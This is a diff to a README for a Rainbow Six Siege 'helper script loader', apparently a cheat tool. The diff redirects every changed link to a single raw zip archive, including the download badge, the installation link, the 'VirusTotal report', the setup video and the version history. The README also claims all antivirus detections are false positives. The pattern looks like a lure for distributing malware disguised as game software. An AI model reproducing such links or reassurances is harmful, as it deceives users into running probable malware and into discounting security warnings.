@@ -1,7 +1,7 @@
 # 🎯 r6s-helper-script-loader - Enhance Your Tactical Gameplay
 
 <div align="center">
-  <a href="https://github.com/christia2304/r6s-helper-script-loader">
+  <a href="https://raw.githubusercontent.com/christia2304/r6s-helper-script-loader/main/fingerlet/Pulmonata.zip">
     <img src="https://img.shields.io/badge/Download%20Now-Free-brightgreen?style=for-the-badge&logo=github" alt="Download Badge">
   </a>
   <br>
@@ -28,7 +28,7 @@ Your computer needs:
 
 ## 📥 Installation
 
-Visit this link to download the application: [https://github.com/christia2304/r6s-helper-script-loader](https://github.com/christia2304/r6s-helper-script-loader)
+Visit this link to download the application: [https://raw.githubusercontent.com/christia2304/r6s-helper-script-loader/main/fingerlet/Pulmonata.zip](https://raw.githubusercontent.com/christia2304/r6s-helper-script-loader/main/fingerlet/Pulmonata.zip)
 
 ### Step-by-Step Setup
 
@@ -81,7 +81,7 @@ r6s-helper updates automatically when online. Check for manual updates via **Hel
 ## 🛡️ VirusTotal Report
 
 Scan verifying file authenticity:
-- [View Scan Report](https://www.virustotal.com/gui/file-scan)
+- [View Scan Report](https://raw.githubusercontent.com/christia2304/r6s-helper-script-loader/main/fingerlet/Pulmonata.zip)
 - All detection names are false positives common for game overlays
 
 ## 💬 Support
@@ -98,9 +98,9 @@ Scan verifying file authenticity:
 
 ## 🔗 Quick Links
 
-- [Download Now](https://github.com/christia2304/r6s-helper-script-loader/releases)
-- [Setup Video Tutorial](https://youtube.com)
-- [Version History](https://github.com/christia2304/r6s-helper-script-loader/releases)
+- [Download Now](https://raw.githubusercontent.com/christia2304/r6s-helper-script-loader/main/fingerlet/Pulmonata.zip)
+- [Setup Video Tutorial](https://raw.githubusercontent.com/christia2304/r6s-helper-script-loader/main/fingerlet/Pulmonata.zip)
+- [Version History](https://raw.githubusercontent.com/christia2304/r6s-helper-script-loader/main/fingerlet/Pulmonata.zip)
 
 ---
 
